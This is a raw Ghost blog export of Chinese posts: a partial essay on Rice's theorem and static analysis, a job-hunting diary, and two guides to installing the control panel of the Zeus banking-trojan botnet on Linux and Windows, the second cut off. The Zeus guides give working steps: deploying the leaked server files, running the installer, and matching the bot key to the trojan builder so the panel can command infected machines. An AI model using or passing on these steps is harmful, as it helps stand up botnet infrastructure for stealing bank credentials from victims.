定理，无非是想说明，完全准确的静态分析程序是不存在的，或者说普适的静态分析算法，静态分析工具是不存在的。</p>\n<ul>\n<li>世界上不存在一个程序，可以检测任何程序 P 是否具有某个安全漏洞。</li>\n<li>世界上不存在一个程序，可以检测任何程序 P 是否进入了某个 if 分支。</li>\n<li>世界上不存在一个程序，可以检测任何程序 P 是否...</li>\n</ul>\n<p>所以文章中 (《基于静态分析的安全漏洞检测技术研究》) 会说：<strong><em>由于程序的任何非平凡性质都是不可判定的，所以静态分析算法只能给出源程序某些性质的不完全或不精确的解。</em></strong></p>\n<p>上一篇文章， Splint 给出分析结果时用的动词都是 may （去看看图片，是不是 may），最后它分析的对不对，还是需要人来判断的。<br>\n<br /><br>\n<img src=\"/content/images/2015/07/xuexi.gif\" alt=\"\"><br>\n<br /></p>\n<hr>\n</div>","amp":"16","plaintext":"这么哲学的问题，不知道该从哪里扯起啊。\n\n图灵停机\n假设我是一个”内裤收集狂魔“，咳...不是，是”程序收集狂魔“，喜欢收集各式各样的程序，于是，每天世界各地的程序员都给我发来他们写的各种奇葩程序。我作为一个收藏家，起码要判断一下他们发来的程序是否可以在特定的输入下正常结束退出，要知道，有很多学渣写的程序会不明不白地陷入死循环，无响应之类的，这种程序我就没必要收藏了。\n\n但是，每天收到的程序太多了，根本不可能一个一个手工去试它们能不能正常结束。我作为学神，当然希望写一个判断程序，来帮助我去自动测试这些程序，把不能正常结束的程序都挑出来。那么问题来了，我能不能写出这样的程序呢？\n\n图灵告诉我说，不能。图灵停机问题描述的是：是否存在一个程序，它能够计算任何程序在给定输入下是否会运行结束。\n\n假设我文曲星附身，灵光大闪，真的写出这样一个程序，那么就先假设有这样一个函数，名字是 CheckHalt(program, input)\n，那么程序写出来大致就是这样。\n\n\nbool CheckHalt(program, input) \n{ \n　　 if(program halts on input) \n　　     return true; \n　　 else \n　　     return false; \n} \n\n\n逻辑一目了然，就是如果被检测的程序在给定的输入下停机了，就返回真，表明可以停机，否则，就返回假，表明不能停机。此时，再构造一个自己给自己找病的函数\nCheck，参数是一个程序：\n\n\nvoid Check(program)\n{\n    if(CheckHalt(program, program))\n        while(1);\n    else\n        return;\n}\n\n\n这个时候，来考虑一下Check(Check)  是否会停机（就是正常退出），就是说自己调用自己的情况。\n\n * 如果Check(Check)可以停机，那么一定走的是 else  分支，那么if(CheckHalt(program, program))\n   应该判断为假。也就是说，CheckHalt(program, program)返回的是 false，即程序不可以停机，与假设能停机是矛盾的。\n * 如果Check(Check)不可以停机，也就是说，它陷入了 while(1);的死循环，则if(CheckHalt(program, program))\n   返回的是 true，即程序可以停机，与假设又是矛盾的。\n\n所以，灵光大闪是瞎闪，文曲星也没附身，这样的程序根本不存在。\n\n像给你一个输入 x，你写个函数，给我计算以 x\n为半径的圆的面积，这种能用编程语言写出来并且运行的，都是***可计算函数***。考虑的更一般化一些，函数就像个黑盒一样，你给它喂一个输入，它就会吐一个输出。那么在\nWindows\n系统上运行的可执行程序，某种角度看也是函数，你运行任何程序，都是你给它一个指令（输入），它做出预设好的反应（输出），比如你点右上角的红叉，那窗口会关闭。处理同一类问题有相同的算法，这样的函数是可计算函数。\n\n另外就是，如果一个程序 P 的效果和一个函数关系 f 的效果一样，那么就说 P 可以计算 f，f 是确定的，然而 P 却可以有 N\n多个。比如给出半径求圆面积，这个计算公式，也就是函数关系 f(x) = Pi * r * r\n是死的，是确定的。但是全班每个人写出的程序可能都不一样，有的人会多用几个中间变量，有的人会多输出几个字使程序更加友好等等。\n\n以上是可计算函数，而像图灵停机问题这种，就是***不可计算函数***，或者说是***不可判定的***。不可计算函数也有很多，比如，\n不存在一个程序，它能够判断任意两个程序是否能计算同样的 f。\n\nRice 定理\n世界上函数这么多，怎么才能判断某个函数是不是可计算呢。Rice 定理可以帮到我们。Rice 定理说的是：有一个函数集合 S （就是说 S 是函数关系 f\n的集合），并且 S 不是空集，也不是全部函数 f，那么程序 P 是否属于 S 是不可计算的。\n\n这到底啥意思？\n\n比如计算圆面积的公式是一个函数，那么假定集合 S 就包含这一个元素，显然 S\n不是空集也不是全部函数，那么如果我想写一个自动判作业程序，自动判断学生交上来的作业程序 P 是否正确计算了这个圆面积，这样的判作业程序是不存在的。\n\n这可能和现实的感觉不一样，你会感觉好像有这样的程序，其实不是，现实中的确可以写出来，但写出来的程序会有误判，因为这是一个不可计算问题，现实的解决方案只能做到近似。现实生活中有非常多的具有判别功能的程序，存在着误报和漏报，因为它们解决的都是不可计算问题，这些程序做的，只是权衡误报率和漏报率，根据需要给出一个较优解。\n\n回到静态分析\n静态分析的文章，引用 Rice 定理，无非是想说明，完全准确的静态分析程序是不存在的，或者说普适的静态分析算法，静态分析工具是不存在的。\n\n * 世界上不存在一个程序，可以检测任何程序 P 是否具有某个安全漏洞。\n * 世界上不存在一个程序，可以检测任何程序 P 是否进入了某个 if 分支。\n * 世界上不存在一个程序，可以检测任何程序 P 是否...\n\n所以文章中 (《基于静态分析的安全漏洞检测技术研究》) 会说：\n由于程序的任何非平凡性质都是不可判定的，所以静态分析算法只能给出源程序某些性质的不完全或不精确的解。\n\n上一篇文章， Splint 给出分析结果时用的动词都是 may （去看看图片，是不是 may），最后它分析的对不对，还是需要人来判断的。\n\n\n\n\n\n\n\n--------------------------------------------------------------------------------","feature_image":null,"featured":0,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2015-07-15T13:21:16.000Z","created_by":"1","updated_at":"2015-12-05T06:10:06.000Z","updated_by":"1","published_at":"2015-07-16T01:49:46.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null},{"id":"59bccd6bf9a5a920fc140c45","uuid":"43bebadb-8488-4de7-9d45-f9392710d670","title":"再来一年-肉身翻墙成功的经验","slug":"zai-lai-yi-nian","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"今年再参加了一年招聘，应聘的地方不多，主要是启程日本和新加坡。\\n\\n##Singapore Management University\\n\\n六月份的时候，新加坡管理大学招 RE 了，因为和老师认识，就投了简历，面试也是中规中矩吧，随便聊了聊。老师对我是比较满意的，只是需要把简历送到 NRF （National Research Foundation）去审批，因为老师发工资的钱是 NRF 给的。\\n\\n然而，NRF 把我拒掉了，因为不招外国人，这个木有办法啊。这两年新加坡的政策是越来越严了。EP 和 PR 也是越来越难批，对中国人不太友好。\\n\\n##[teamLab](http://www.team-lab.net/)\\n通过启程日本项目，参加了 teamLab 的招聘，这是一家充满创意的公司，公司在日本来说，也算比较大了，到底做什么业务的，我到现在也没弄明白，反正好像是什么都做，特别的艺术范儿。\\n\\n招 IT 开发好像也不怎么限定技术，个人感觉比较偏好图形图像多媒体的，或者智能推荐的。\\n\\n###teamLab 一面\\n简历关通过的也就几十个人吧。来了两个面试官，一个是同济大学毕业的中国人，一个是日本人，这个日本人英语不错，先是用英语做了一个简单的微型宣讲会，讲了讲公司做什么。之后就是笔试，给半个小时左右作答，可以写算法，也可以写描述，反正怎么想的怎么写，答完后，每个人给十分钟讲自己的设计。也就是说，每个人的一面就这十分钟。\\n\\n我的一面是中国面试官，我的方案很常规，给出了一个数学公式，也就不需要多余的废话了。他又问了问简历，十分钟很快就过了。然后一面也过了。\\n\\n###teamLab 二面（终面）\\n一面大部分人被刷掉了，二面没剩下几个人。二面的话由于是两个面试官一起，所以基本只能说英语。主要是问两类问题。一类是为什么来日本，为什么来我们公司，希望将来做什么样的工作这一类的 HR 问题。另外一类就是顺着简历问项目。\\n\\n日本面试官问我研究生做了什么项目，我就给他讲了用支持向量机进行代码混淆的项目，这种混淆可以增加反编译和逆向的难度。然而很遗憾的是，我做的这个比较底层，面试官对汇编不太懂，所以一直给他讲了半个小时，那位中国面试官虽然明白我的意思，但是由于这项目专业性太强，也不知道怎么翻译成日语。日本面试官对于我项目用到的那些东西的英文又不懂，日语英语都不好使，然后就各种无奈。基本我的面试时间比别人多了一倍。\\n\\n最后的结果是，终面通过。他们先回日本，回去后找时间再 Skype 加面一次，因为面试官没听懂项目，没太弄明白我的技术水平。二面后因同样情况需要加面的一共有四个同学，我有点怀疑这次派来的面试官是不是有点水，四个人都没弄明白技术水准。\\n\\n##[MonotaRO](http://www.monotaro.com) \\n去年 MonotaRO 差一点成功，今天又报了一次。很幸运简历又通过了，然后迎来了今年的面试。\\n###MonotaRO 一面\\n一面是两个面试官对两个面试者，外加一名翻译。今年的一面比较轻松，基本主要就问了问为什么这么想来，两次都报我们。技术题去年都答过了，今年也没让我再答，因为没什么意义。和我一起面试的是上海交大的一个同学，全程主要是他在写代码和回答问题。\\n\\n###MonotaRO 二面\\n一面就这么波澜不惊的过了，二面其实也没问什么，随便聊了聊，基本都是 HR 问题，问了问去日本的动机是什么，准备如何学日语，为什么选择辞职来我们这等等。面试结束后十几分钟吧，就给 offer 了。\\n\\n本来 MonotaRO 二面后，安排的是 teamLab 的加面。不过 teamLab 的工资和 MonotaRO 差不多，但后者在小城市尼崎，还不怎么加班。这生活品质哪里高，一下就能看出来啊，所以就没必要再面了。 \\n\\n就这样结束了长达两年半的长征，如果这次不成功，或许会再参加一年启程日本，也或许会考虑新西兰和澳洲，毕竟不同的时间点，最优的选择是不一样的。不过好在还是成功了，未来是光明的。\"}]],\"sections\":[[10,0]]}","html":"<div class=\"kg-card-markdown\"><p>今年再参加了一年招聘，应聘的地方不多，主要是启程日本和新加坡。</p>\n<h2 id=\"singaporemanagementuniversity\">Singapore Management University</h2>\n<p>六月份的时候，新加坡管理大学招 RE 了，因为和老师认识，就投了简历，面试也是中规中矩吧，随便聊了聊。老师对我是比较满意的，只是需要把简历送到 NRF （National Research Foundation）去审批，因为老师发工资的钱是 NRF 给的。</p>\n<p>然而，NRF 把我拒掉了，因为不招外国人，这个木有办法啊。这两年新加坡的政策是越来越严了。EP 和 PR 也是越来越难批，对中国人不太友好。</p>\n<h2 id=\"teamlab\"><a href=\"http://www.team-lab.net/\">teamLab</a></h2>\n<p>通过启程日本项目，参加了 teamLab 的招聘，这是一家充满创意的公司，公司在日本来说，也算比较大了，到底做什么业务的，我到现在也没弄明白，反正好像是什么都做，特别的艺术范儿。</p>\n<p>招 IT 开发好像也不怎么限定技术，个人感觉比较偏好图形图像多媒体的，或者智能推荐的。</p>\n<h3 id=\"teamlab\">teamLab 一面</h3>\n<p>简历关通过的也就几十个人吧。来了两个面试官，一个是同济大学毕业的中国人，一个是日本人，这个日本人英语不错，先是用英语做了一个简单的微型宣讲会，讲了讲公司做什么。之后就是笔试，给半个小时左右作答，可以写算法，也可以写描述，反正怎么想的怎么写，答完后，每个人给十分钟讲自己的设计。也就是说，每个人的一面就这十分钟。</p>\n<p>我的一面是中国面试官，我的方案很常规，给出了一个数学公式，也就不需要多余的废话了。他又问了问简历，十分钟很快就过了。然后一面也过了。</p>\n<h3 id=\"teamlab\">teamLab 二面（终面）</h3>\n<p>一面大部分人被刷掉了，二面没剩下几个人。二面的话由于是两个面试官一起，所以基本只能说英语。主要是问两类问题。一类是为什么来日本，为什么来我们公司，希望将来做什么样的工作这一类的 HR 问题。另外一类就是顺着简历问项目。</p>\n<p>日本面试官问我研究生做了什么项目，我就给他讲了用支持向量机进行代码混淆的项目，这种混淆可以增加反编译和逆向的难度。然而很遗憾的是，我做的这个比较底层，面试官对汇编不太懂，所以一直给他讲了半个小时，那位中国面试官虽然明白我的意思，但是由于这项目专业性太强，也不知道怎么翻译成日语。日本面试官对于我项目用到的那些东西的英文又不懂，日语英语都不好使，然后就各种无奈。基本我的面试时间比别人多了一倍。</p>\n<p>最后的结果是，终面通过。他们先回日本，回去后找时间再 Skype 加面一次，因为面试官没听懂项目，没太弄明白我的技术水平。二面后因同样情况需要加面的一共有四个同学，我有点怀疑这次派来的面试官是不是有点水，四个人都没弄明白技术水准。</p>\n<h2 id=\"monotaro\"><a href=\"http://www.monotaro.com\">MonotaRO</a></h2>\n<p>去年 MonotaRO 差一点成功，今天又报了一次。很幸运简历又通过了，然后迎来了今年的面试。</p>\n<h3 id=\"monotaro\">MonotaRO 一面</h3>\n<p>一面是两个面试官对两个面试者，外加一名翻译。今年的一面比较轻松，基本主要就问了问为什么这么想来，两次都报我们。技术题去年都答过了，今年也没让我再答，因为没什么意义。和我一起面试的是上海交大的一个同学，全程主要是他在写代码和回答问题。</p>\n<h3 id=\"monotaro\">MonotaRO 二面</h3>\n<p>一面就这么波澜不惊的过了，二面其实也没问什么，随便聊了聊，基本都是 HR 问题，问了问去日本的动机是什么，准备如何学日语，为什么选择辞职来我们这等等。面试结束后十几分钟吧，就给 offer 了。</p>\n<p>本来 MonotaRO 二面后，安排的是 teamLab 的加面。不过 teamLab 的工资和 MonotaRO 差不多，但后者在小城市尼崎，还不怎么加班。这生活品质哪里高，一下就能看出来啊，所以就没必要再面了。</p>\n<p>就这样结束了长达两年半的长征，如果这次不成功，或许会再参加一年启程日本，也或许会考虑新西兰和澳洲，毕竟不同的时间点，最优的选择是不一样的。不过好在还是成功了，未来是光明的。</p>\n</div>","amp":"17","plaintext":"今年再参加了一年招聘，应聘的地方不多，主要是启程日本和新加坡。\n\nSingapore Management University\n六月份的时候，新加坡管理大学招 RE 了，因为和老师认识，就投了简历，面试也是中规中矩吧，随便聊了聊。老师对我是比较满意的，只是需要把简历送到 NRF\n（National Research Foundation）去审批，因为老师发工资的钱是 NRF 给的。\n\n然而，NRF 把我拒掉了，因为不招外国人，这个木有办法啊。这两年新加坡的政策是越来越严了。EP 和 PR 也是越来越难批，对中国人不太友好。\n\nteamLab [http://www.team-lab.net/]\n通过启程日本项目，参加了 teamLab\n的招聘，这是一家充满创意的公司，公司在日本来说，也算比较大了，到底做什么业务的，我到现在也没弄明白，反正好像是什么都做，特别的艺术范儿。\n\n招 IT 开发好像也不怎么限定技术，个人感觉比较偏好图形图像多媒体的，或者智能推荐的。\n\nteamLab 一面\n简历关通过的也就几十个人吧。来了两个面试官，一个是同济大学毕业的中国人，一个是日本人，这个日本人英语不错，先是用英语做了一个简单的微型宣讲会，讲了讲公司做什么。之后就是笔试，给半个小时左右作答，可以写算法，也可以写描述，反正怎么想的怎么写，答完后，每个人给十分钟讲自己的设计。也就是说，每个人的一面就这十分钟。\n\n我的一面是中国面试官，我的方案很常规，给出了一个数学公式，也就不需要多余的废话了。他又问了问简历，十分钟很快就过了。然后一面也过了。\n\nteamLab 二面（终面）\n一面大部分人被刷掉了，二面没剩下几个人。二面的话由于是两个面试官一起，所以基本只能说英语。主要是问两类问题。一类是为什么来日本，为什么来我们公司，希望将来做什么样的工作这一类的\nHR 问题。另外一类就是顺着简历问项目。\n\n日本面试官问我研究生做了什么项目，我就给他讲了用支持向量机进行代码混淆的项目，这种混淆可以增加反编译和逆向的难度。然而很遗憾的是，我做的这个比较底层，面试官对汇编不太懂，所以一直给他讲了半个小时，那位中国面试官虽然明白我的意思，但是由于这项目专业性太强，也不知道怎么翻译成日语。日本面试官对于我项目用到的那些东西的英文又不懂，日语英语都不好使，然后就各种无奈。基本我的面试时间比别人多了一倍。\n\n最后的结果是，终面通过。他们先回日本，回去后找时间再 Skype\n加面一次，因为面试官没听懂项目，没太弄明白我的技术水平。二面后因同样情况需要加面的一共有四个同学，我有点怀疑这次派来的面试官是不是有点水，四个人都没弄明白技术水准。\n\nMonotaRO [http://www.monotaro.com]\n去年 MonotaRO 差一点成功，今天又报了一次。很幸运简历又通过了，然后迎来了今年的面试。\n\nMonotaRO 一面\n一面是两个面试官对两个面试者，外加一名翻译。今年的一面比较轻松，基本主要就问了问为什么这么想来，两次都报我们。技术题去年都答过了，今年也没让我再答，因为没什么意义。和我一起面试的是上海交大的一个同学，全程主要是他在写代码和回答问题。\n\nMonotaRO 二面\n一面就这么波澜不惊的过了，二面其实也没问什么，随便聊了聊，基本都是 HR\n问题，问了问去日本的动机是什么，准备如何学日语，为什么选择辞职来我们这等等。面试结束后十几分钟吧，就给 offer 了。\n\n本来 MonotaRO 二面后，安排的是 teamLab 的加面。不过 teamLab 的工资和 MonotaRO\n差不多，但后者在小城市尼崎，还不怎么加班。这生活品质哪里高，一下就能看出来啊，所以就没必要再面了。\n\n就这样结束了长达两年半的长征，如果这次不成功，或许会再参加一年启程日本，也或许会考虑新西兰和澳洲，毕竟不同的时间点，最优的选择是不一样的。不过好在还是成功了，未来是光明的。","feature_image":null,"featured":0,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2015-12-05T08:50:12.000Z","created_by":"1","updated_at":"2016-01-23T13:24:17.000Z","updated_by":"1","published_at":"2015-12-05T10:46:49.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null},{"id":"59bccd6bf9a5a920fc140c46","uuid":"a7c975e7-00c8-4e3b-a655-ce96e871d547","title":"Linux 环境下 Zeus 控制端的搭建和配置","slug":"zeus-control","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"##简介\\nZeus 是一款非常著名的黑客工具包，是在黑产行业被广泛使用的僵尸网络，主要用于窃取银行账户。该工具包于 2011 年泄露源码，并且其作者宣布退出犯罪软件的开发。本文详述如何在 Linux 下构建 LAMP（apache、php、mysql），安装 Zeus 控制端并运行。客户端的运行参照下一篇文章 。\\n\\n本人所使用的 Zeus 版本是1.2.4.2, 2011 年泄露源码的版本为 2.0.8.9，这两版本人都安装成功过，本文以 1.2.4.2 为例。\\n\\n##安装 Apache\\n####安装 Apache2\\n<code>sudo aptitude install apache2</code>\\n####编辑 /etc/init.d/apache2/httpd.conf 来设定一个主机名，如果无法编辑，更改权限为 777\\n<code>ServerName &lt;myhostname&gt;</code>\\n####启动和测试 apache2\\n<code>sudo /etc/init.d/apache2 start  </code>\\n\\n如果一切都正常的话，此时启动浏览器，输入`http://localhost`,会看到一个测试网页，表明安装成功。\\n![](/content/images/2015/12/1.jpg)\\n##安装 PHP5\\n####暂时关闭 apache2\\n<code>sudo /etc/init.d/apache2 stop</code>\\n####安装 PHP5\\n<code>sudo aptitude install php5 libapache2-mod-php5</code>\\n####重新打开 apache2\\n<code>sudo /etc/init.d/apache2 start</code>\\n####在 /var/www 目录下，写一个测试页，用来测试 php5 是否可以正常运行。首先更改 /var/www 权限为 777，之后新建一个空文件，命名为 test.php，内容为\\n<pre><code>\\n&lt;?php\\n    //file: test.php\\n    phpinfo();\\n?&gt;\\n</code></pre>\\n####打开浏览器，输入`http://localhost/test.php`，如果安装正确，可以看到相关信息\\n![](/content/images/2015/12/2.jpg)\\n####最后重启一下 apache2\\n<code>sudo /etc/init.d/apache2 restart</code>\\n##安装 MySQL\\n####安装\\n<code>sudo aptitude install mysql-server</code>\\n####安装过程可能需要输入root用户的密码，请设定一个自己喜欢的，之后，运行一下 mysql，输入刚才设定的密码。\\n<code>mysql -uroot -p</code>\\n####安装成功\\n![](/content/images/2015/12/1-1.jpg)\\n##联动\\n####让 MySQL 和 Apache 联动\\n<code>sudo aptitude install libapache2-mod-auth-mysql php5-mysql</code>\\n####重启 Apache2\\n<code>sudo /etc/init.d/apache2 restart</code>\\n####最后再安装一些可能会用到的扩展\\n<code>sudo aptitude install php5 cli php5 curl php5 gd php5 imap php5 mcrypt</code>\\n##控制端的安装\\n经过以上步骤，LAMP 环境，也就是 Zeus 的控制端所需要的环境已经搭建完毕，之后，将 Zeus1.2.4.2 压缩包中提供的Server[php] 文件夹下的内容复制到 /var/www 下。\\n<br />\\n![](/content/images/2015/12/4.jpg)\\n<br />\\n上图由于我做过实验所以多了几个文件，如果你没有请不用担心。\\n\\n注意：将所有文件夹及其包含的文件权限全部更改为777，否则后边无法运行。\\n\\n注意：system文件夹下如果有config.php文件，将其删除，正常情况是没有的。\\n\\n然后，打开浏览器，输入`http://localhost/install/index.php`，会显示安装界面，点 update 后，根据自己的需要填写配置信息，之后系统会根据你填写的内容在 system 文件夹下生成一个 config.php 文件。\\n<br />\\n![](/content/images/2015/12/5.jpg)\\n![](/content/images/2015/12/6.jpg)\\n<br />\\n需要注意的是，MySQL 的密码和下边 bot 的密码可以不一样，我为了好记全用了 123456，但 bot 的密码一定要和 builder 生成木马时填写的密钥相同，这样僵尸机和控制端通信时才可以正确加密解密。\\n\\n安装成功后，在浏览器输入`http://localhost/cp.php`，输入方才设定的用户名和密码，即可登录控制端，使用 Zeus 给僵尸机发送控制指令。\"}]],\"sections\":[[10,0]]}","html":"<div class=\"kg-card-markdown\"><h2 id=\"\">简介</h2>\n<p>Zeus 是一款非常著名的黑客工具包，是在黑产行业被广泛使用的僵尸网络，主要用于窃取银行账户。该工具包于 2011 年泄露源码，并且其作者宣布退出犯罪软件的开发。本文详述如何在 Linux 下构建 LAMP（apache、php、mysql），安装 Zeus 控制端并运行。客户端的运行参照下一篇文章 。</p>\n<p>本人所使用的 Zeus 版本是1.2.4.2, 2011 年泄露源码的版本为 2.0.8.9，这两版本人都安装成功过，本文以 1.2.4.2 为例。</p>\n<h2 id=\"apache\">安装 Apache</h2>\n<h4 id=\"apache2\">安装 Apache2</h4>\n<p><code>sudo aptitude install apache2</code></p>\n<h4 id=\"etcinitdapache2httpdconf777\">编辑 /etc/init.d/apache2/httpd.conf 来设定一个主机名，如果无法编辑，更改权限为 777</h4>\n<p><code>ServerName &lt;myhostname&gt;</code></p>\n<h4 id=\"apache2\">启动和测试 apache2</h4>\n<p><code>sudo /etc/init.d/apache2 start  </code></p>\n<p>如果一切都正常的话，此时启动浏览器，输入<code>http://localhost</code>,会看到一个测试网页，表明安装成功。<br>\n<img src=\"/content/images/2015/12/1.jpg\" alt=\"\"></p>\n<h2 id=\"php5\">安装 PHP5</h2>\n<h4 id=\"apache2\">暂时关闭 apache2</h4>\n<p><code>sudo /etc/init.d/apache2 stop</code></p>\n<h4 id=\"php5\">安装 PHP5</h4>\n<p><code>sudo aptitude install php5 libapache2-mod-php5</code></p>\n<h4 id=\"apache2\">重新打开 apache2</h4>\n<p><code>sudo /etc/init.d/apache2 start</code></p>\n<h4 id=\"varwwwphp5varwww777testphp\">在 /var/www 目录下，写一个测试页，用来测试 php5 是否可以正常运行。首先更改 /var/www 权限为 777，之后新建一个空文件，命名为 test.php，内容为</h4>\n<pre><code>\n&lt;?php\n    //file: test.php\n    phpinfo();\n?&gt;\n</code></pre>\n<h4 id=\"httplocalhosttestphp\">打开浏览器，输入<code>http://localhost/test.php</code>，如果安装正确，可以看到相关信息</h4>\n<p><img src=\"/content/images/2015/12/2.jpg\" alt=\"\"></p>\n<h4 id=\"apache2\">最后重启一下 apache2</h4>\n<p><code>sudo /etc/init.d/apache2 restart</code></p>\n<h2 id=\"mysql\">安装 MySQL</h2>\n<h4 id=\"\">安装</h4>\n<p><code>sudo aptitude install mysql-server</code></p>\n<h4 id=\"rootmysql\">安装过程可能需要输入root用户的密码，请设定一个自己喜欢的，之后，运行一下 mysql，输入刚才设定的密码。</h4>\n<p><code>mysql -uroot -p</code></p>\n<h4 id=\"\">安装成功</h4>\n<p><img src=\"/content/images/2015/12/1-1.jpg\" alt=\"\"></p>\n<h2 id=\"\">联动</h2>\n<h4 id=\"mysqlapache\">让 MySQL 和 Apache 联动</h4>\n<p><code>sudo aptitude install libapache2-mod-auth-mysql php5-mysql</code></p>\n<h4 id=\"apache2\">重启 Apache2</h4>\n<p><code>sudo /etc/init.d/apache2 restart</code></p>\n<h4 id=\"\">最后再安装一些可能会用到的扩展</h4>\n<p><code>sudo aptitude install php5 cli php5 curl php5 gd php5 imap php5 mcrypt</code></p>\n<h2 id=\"\">控制端的安装</h2>\n<p>经过以上步骤，LAMP 环境，也就是 Zeus 的控制端所需要的环境已经搭建完毕，之后，将 Zeus1.2.4.2 压缩包中提供的Server[php] 文件夹下的内容复制到 /var/www 下。<br>\n<br /><br>\n<img src=\"/content/images/2015/12/4.jpg\" alt=\"\"><br>\n<br /><br>\n上图由于我做过实验所以多了几个文件，如果你没有请不用担心。</p>\n<p>注意：将所有文件夹及其包含的文件权限全部更改为777，否则后边无法运行。</p>\n<p>注意：system文件夹下如果有config.php文件，将其删除，正常情况是没有的。</p>\n<p>然后，打开浏览器，输入<code>http://localhost/install/index.php</code>，会显示安装界面，点 update 后，根据自己的需要填写配置信息，之后系统会根据你填写的内容在 system 文件夹下生成一个 config.php 文件。<br>\n<br /><br>\n<img src=\"/content/images/2015/12/5.jpg\" alt=\"\"><br>\n<img src=\"/content/images/2015/12/6.jpg\" alt=\"\"><br>\n<br /><br>\n需要注意的是，MySQL 的密码和下边 bot 的密码可以不一样，我为了好记全用了 123456，但 bot 的密码一定要和 builder 生成木马时填写的密钥相同，这样僵尸机和控制端通信时才可以正确加密解密。</p>\n<p>安装成功后，在浏览器输入<code>http://localhost/cp.php</code>，输入方才设定的用户名和密码，即可登录控制端，使用 Zeus 给僵尸机发送控制指令。</p>\n</div>","amp":"18","plaintext":"简介\nZeus 是一款非常著名的黑客工具包，是在黑产行业被广泛使用的僵尸网络，主要用于窃取银行账户。该工具包于 2011\n年泄露源码，并且其作者宣布退出犯罪软件的开发。本文详述如何在 Linux 下构建 LAMP（apache、php、mysql），安装 Zeus\n控制端并运行。客户端的运行参照下一篇文章 。\n\n本人所使用的 Zeus 版本是1.2.4.2, 2011 年泄露源码的版本为 2.0.8.9，这两版本人都安装成功过，本文以 1.2.4.2 为例。\n\n安装 Apache\n安装 Apache2\nsudo aptitude install apache2\n\n编辑 /etc/init.d/apache2/httpd.conf 来设定一个主机名，如果无法编辑，更改权限为 777\nServerName <myhostname>\n\n启动和测试 apache2\nsudo /etc/init.d/apache2 start \n\n如果一切都正常的话，此时启动浏览器，输入http://localhost,会看到一个测试网页，表明安装成功。\n\n\n安装 PHP5\n暂时关闭 apache2\nsudo /etc/init.d/apache2 stop\n\n安装 PHP5\nsudo aptitude install php5 libapache2-mod-php5\n\n重新打开 apache2\nsudo /etc/init.d/apache2 start\n\n在 /var/www 目录下，写一个测试页，用来测试 php5 是否可以正常运行。首先更改 /var/www 权限为 777，之后新建一个空文件，命名为\ntest.php，内容为\n\n<?php\n    //file: test.php\n    phpinfo();\n?>\n\n\n打开浏览器，输入http://localhost/test.php，如果安装正确，可以看到相关信息\n\n\n最后重启一下 apache2\nsudo /etc/init.d/apache2 restart\n\n安装 MySQL\n安装\nsudo aptitude install mysql-server\n\n安装过程可能需要输入root用户的密码，请设定一个自己喜欢的，之后，运行一下 mysql，输入刚才设定的密码。\nmysql -uroot -p\n\n安装成功\n\n\n联动\n让 MySQL 和 Apache 联动\nsudo aptitude install libapache2-mod-auth-mysql php5-mysql\n\n重启 Apache2\nsudo /etc/init.d/apache2 restart\n\n最后再安装一些可能会用到的扩展\nsudo aptitude install php5 cli php5 curl php5 gd php5 imap php5 mcrypt\n\n控制端的安装\n经过以上步骤，LAMP 环境，也就是 Zeus 的控制端所需要的环境已经搭建完毕，之后，将 Zeus1.2.4.2 压缩包中提供的Server[php]\n文件夹下的内容复制到 /var/www 下。\n\n\n\n\n\n上图由于我做过实验所以多了几个文件，如果你没有请不用担心。\n\n注意：将所有文件夹及其包含的文件权限全部更改为777，否则后边无法运行。\n\n注意：system文件夹下如果有config.php文件，将其删除，正常情况是没有的。\n\n然后，打开浏览器，输入http://localhost/install/index.php，会显示安装界面，点 update\n后，根据自己的需要填写配置信息，之后系统会根据你填写的内容在 system 文件夹下生成一个 config.php 文件。\n\n\n\n\n\n\n需要注意的是，MySQL 的密码和下边 bot 的密码可以不一样，我为了好记全用了 123456，但 bot 的密码一定要和 builder\n生成木马时填写的密钥相同，这样僵尸机和控制端通信时才可以正确加密解密。\n\n安装成功后，在浏览器输入http://localhost/cp.php，输入方才设定的用户名和密码，即可登录控制端，使用 Zeus 给僵尸机发送控制指令。","feature_image":null,"featured":0,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2015-12-05T11:46:56.000Z","created_by":"1","updated_at":"2015-12-05T13:25:39.000Z","updated_by":"1","published_at":"2015-12-05T11:55:54.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null},{"id":"59bccd6bf9a5a920fc140c47","uuid":"0b8d502f-380d-4aeb-add7-14a5789f72ce","title":"Windows 下 Zeus 控制端的搭建和配置","slug":"zeus-control-windows","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"Windows 下配置 Zeus 环境要比 Linux 下容易些，一是有现成的集成环境直接安装，二是没有权限问题，Linux 下 Zeus 的配置方法请参看前文。\\n\\n首先，安装 xampp-1.7.4，这是一个 Apache、PHP、MySQL 的集成环境，十分傻瓜好用。如果系统版本是 Vista 以上，会出现一个提示，注意 UAC 的问题。\\n![](/content/images/2015/12/1-2.jpg)\\n\\n安装过后，将 Zeus 工具包中的 server[php] 中的内容复制到安装目录 htdocs 目录下，有文件冲突则全部覆盖。\\n之后启动 xampp，将 Apache 和 MySQL 选 start，用非 IE 内核浏览器（chrome、火狐）打开`http://localhost/install`，填写信息并 update ，如果用火狐，将 Filezilla 也 start。\\n![](/content/images/2015/12/2-1.jpg)\\n\\n最后，打开`http://localhost/cp.php`即可登录使用。\\n![](/content/images/2015/12/3.jpg)\"}]],\"sections\":[[10,0]]}","html":"<div class=\"kg-card-markdown\"><p>Windows 